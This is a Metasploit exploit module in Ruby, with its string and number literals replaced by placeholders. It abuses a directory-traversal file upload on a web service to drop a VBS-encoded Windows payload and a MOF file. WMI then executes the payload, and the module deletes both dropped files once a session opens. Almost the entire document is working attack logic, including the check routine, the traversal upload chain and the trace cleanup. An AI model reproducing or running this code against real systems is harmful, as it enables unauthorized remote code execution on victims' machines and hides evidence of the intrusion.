require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking HttpFingerprint = { <str> = > [ <str> ] } include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > true , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ [ <str> , { } ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptBool . new ( <str> , [ true , <str> , true ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def on_new_session ( client ) return if not @var_mof_name return if not @var_vbs_name vbs_path = <str> @var_vbs_name <str> mof_path = <str> @var_mof_name <str> if client . type != <str> print_error ( <str> ) print_error ( <str> vbs_path <str> mof_path <str> ) return end client . core . use ( <str> ) if not client . ext . aliases . include? ( <str> ) attrib_path = <str> cmd = attrib_path + mof_path client . sys . process . execute ( cmd , nil , { <str> = > true } ) begin print_warning ( <str> @var_vbs_name <str> ) client . fs . file . rm ( vbs_path ) print_warning ( <str> @var_mof_name <str> ) client . fs . file . rm ( mof_path ) rescue :: Exception = > e print_error ( <str> e . inspect <str> ) end end def upload_file ( data ) res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > data } ) return res end def check file_name = rand_text_alpha ( rand ( <int> ) + <int> ) file_contents = rand_text_alpha ( rand ( <int> ) + <int> ) data = <str> file_name <str> data << <str> data << Rex :: Text . uri_encode ( file_contents ) print_status ( <str> file_name <str> ) res = upload_file ( data ) if not res or res . code != <int> or ( res . body !~ <str> and res . body !~ <str> ) vprint_error ( <str> ) return Exploit :: CheckCode :: Safe end print_status ( <str> ) res = send_request_raw ( { <str> = > <str> file_name <str> } ) if res and res . code == <int> and res . body =~ <str> file_contents <str> return Exploit :: CheckCode :: Vulnerable end return Exploit :: CheckCode :: Appears end def exploit @var_mof_name = rand_text_alpha ( rand ( <int> ) + <int> ) @var_vbs_name = rand_text_alpha ( rand ( <int> ) + <int> ) print_status ( <str> ) exe = Msf :: Util :: EXE . to_win32pe_old ( framework , payload . encoded ) vbs = Msf :: Util :: EXE . to_exe_vbs ( exe ) print_status ( <str> ) mof_content = generate_mof ( <str> @var_mof_name <str> , <str> @var_vbs_name <str> ) traversal = <str> * datastore [ <str> ] data = <str> traversal <str> @var_vbs_name <str> data << <str> data << Rex :: Text . uri_encode ( vbs ) print_status ( <str> @var_vbs_name <str> ) res = upload_file ( data ) if not res or res . code != <int> or ( res . body !~ <str> and res . body !~ <str> ) fail_with ( Failure :: Unknown , <str> ) end data = <str> traversal <str> @var_mof_name <str> data << <str> data << Rex :: Text . uri_encode ( mof_content ) print_status ( <str> @var_mof_name <str> ) res = upload_file ( data ) if not res or res . code != <int> or ( res . body !~ <str> and res . body !~ <str> ) fail_with ( Failure :: Unknown , <str> ) end end end 
